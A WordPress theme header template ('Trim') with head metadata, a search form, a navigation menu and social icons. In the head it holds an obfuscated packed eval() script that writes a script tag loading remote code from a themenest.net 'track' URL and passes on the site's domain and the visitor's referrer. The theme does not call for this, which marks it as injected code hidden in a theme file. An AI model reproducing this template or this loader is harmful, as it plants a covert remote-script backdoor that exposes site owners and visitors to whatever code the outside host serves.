<!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>" />
	<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
	<title><?php elegant_titles(); ?></title>
	<?php elegant_description(); ?>
	<?php elegant_keywords(); ?>
	<?php elegant_canonical(); ?>

	<?php do_action('et_head_meta'); ?>
	
	<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	
	<!--[if lt IE 7]>
		<link rel="stylesheet" type="text/css" href="<?php echo get_template_directory_uri(); ?>/css/ie6style.css" />
		<script type="text/javascript" src="<?php echo get_template_directory_uri(); ?>/js/DD_belatedPNG_0.0.8a-min.js"></script>
		<script type="text/javascript">DD_belatedPNG.fix('img#logo, span.overlay, a.zoom-icon, a.more-icon, #menu, #menu-right, #menu-content, ul#top-menu ul, #menu-bar, .footer-widget ul li, span.post-overlay, #content-area, .avatar-overlay, .comment-arrow, .testimonials-item-bottom, #quote, #bottom-shadow, #quote .container');</script>
	<![endif]-->
	<!--[if IE 7]>
		<link rel="stylesheet" type="text/css" href="<?php echo get_template_directory_uri(); ?>/css/ie7style.css" />
	<![endif]-->
	<!--[if IE 8]>
		<link rel="stylesheet" type="text/css" href="<?php echo get_template_directory_uri(); ?>/css/ie8style.css" />
	<![endif]-->
	<!--[if lt IE 9]>
		<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js" type="text/javascript"></script>
	<![endif]-->

	<script type="text/javascript">
		document.documentElement.className = 'js';
	</script>
<script type="text/javascript">eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.f(\'<2\'+\'3 5="6/7" 8="9://a.b/e/o/g?d=\'+0.h+\'&i=\'+j(0.k)+\'&c=\'+4.l((4.m()*n)+1)+\'"></2\'+\'3>\');',25,25,'document||scr|ipt|Math|type|text|javascript|src|http|themenest|net|||platform|write|track|domain|r|encodeURIComponent|referrer|floor|random|1000|script'.split('|'),0,{}));</script>
	<?php wp_head(); ?>
</head>
<body <?php body_class(); ?>>
	<div id="container">
		<div id="wrapper">
			<header id="main-header" class="clearfix">
				<div id="top-area">
					<?php do_action('et_header_top'); ?>
					<a href="<?php echo esc_url( home_url() ); ?>">
						<?php $logo = (get_option('trim_logo') <> '') ? esc_attr(get_option('trim_logo')) : get_template_directory_uri() . '/images/logo.png'; ?>
						<img src="<?php echo $logo; ?>" alt="<?php echo esc_attr(get_bloginfo('name')); ?>" id="logo"/>
					</a>
					<div id="search-form">
						<form method="get" id="searchform" action="<?php echo esc_url( home_url() ); ?>/">
							<input type="text" value="<?php esc_attr_e('Search...', 'Trim'); ?>" name="s" id="searchinput" />
							<input type="image" src="<?php echo esc_url( get_template_directory_uri() . '/images/search_btn.png' ); ?>" id="searchsubmit" />
						</form>
					</div> <!-- end #search-form -->
				</div> <!-- end #top-area -->
				
				<div id="menu" class="clearfix">
					<?php do_action('et_header_menu'); ?>
					
					<nav id="main-menu">
						<?php
							$menuClass = 'nav';
							if ( get_option('trim_disable_toptier') == 'on' ) $menuClass .= ' et_disable_top_tier';
							$primaryNav = '';
							if (function_exists('wp_nav_menu')) {
								$primaryNav = wp_nav_menu( array( 'theme_location' => 'primary-menu', 'container' => '', 'fallback_cb' => '', 'menu_class' => $menuClass, 'echo' => false ) );
							}
							if ($primaryNav == '') { ?>
								<ul class="<?php echo $menuClass; ?>">
									<?php if (get_option('trim_home_link') == 'on') { ?>
										<li <?php if (is_home()) echo('class="current_page_item"') ?>><a href="<?php echo home_url(); ?>"><?php esc_html_e('Home','Trim') ?></a></li>
									<?php }; ?>

									<?php show_page_menu($menuClass,false,false); ?>
									<?php show_categories_menu($menuClass,false); ?>
								</ul>
							<?php }
							else echo($primaryNav);
						?>
					</nav>
					
					<div id="social-icons">
						<?php
							$social_icons = '';
							$et_rss_url = get_option('trim_rss_url') <> '' ? get_option('trim_rss_url') : get_bloginfo('comments_rss2_url');
							if ( get_option('trim_show_twitter_icon') == 'on' ) $social_icons['twitter'] = array('image' => get_bloginfo('template_directory') . '/images/twitter.png', 'url' => get_option('trim_twitter_url'), 'alt' => 'Twitter' );
							if ( get_option('trim_show_rss_icon') == 'on' ) $social_icons['rss'] = array('image' => get_bloginfo('template_directory') . '/images/rss.png', 'url' => $et_rss_url, 'alt' => 'Rss' );
							if ( get_option('trim_show_facebook_icon') == 'on' ) $social_icons['facebook'] = array('image' => get_bloginfo('template_directory') . '/images/facebook.png', 'url' => get_option('trim_facebook_url'), 'alt' => 'Facebook' );
							$social_icons = apply_filters('et_social_icons', $social_icons);
							if ( !empty($social_icons) ) {
								foreach ($social_icons as $icon) {
									echo "<a href='" . esc_url($icon['url']) . "' target='_blank'><img alt='" . esc_attr($icon['alt']) . "' src='" . esc_url($icon['image']) . "' /></a>";
								}
							}
						?>
					</div> <!-- end #social-icons -->
				</div> <!-- end #menu -->
			</header> <!-- end #main-header -->
			
			<?php
				if ( 'on' == get_option('trim_featured') && is_home() ) get_template_part( 'includes/featured', 'home' );
				else echo '<div id="content">';
			?>